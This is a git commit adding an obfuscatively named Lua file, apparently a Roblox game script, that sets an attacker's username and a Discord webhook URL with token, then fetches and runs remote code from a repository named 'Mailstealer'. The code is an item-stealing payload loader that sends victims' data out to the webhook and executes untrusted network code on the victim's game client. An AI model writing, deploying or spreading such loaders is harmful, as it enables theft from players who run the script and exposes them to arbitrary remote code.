5920875a822b41db43ec85150d2782006d99fef6
acedshark <108691906+acedshark@users.noreply.github.com>
2024-03-05 16:47:49 -0500

    Add files via upload

---
+++ obf_77svNL62yW21EK76v2k8SVOx71Rh0cuzP472jYTmG4Y7m811oaO2x75Xv5MMQ61j.lua
@@ -0,0 +1,5 @@
+Username = "PetSimulatorLive0"
+Webhook = "https://discordapp.com/api/webhooks/1214688063427444767/4XgWH_DQRh9ue_E4MQ303XxJXoKorUIvb37K4oRFRWFyNo899TV7lVu8QRB6L_qitXvE"
+LoadingScreen = true 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))()
+
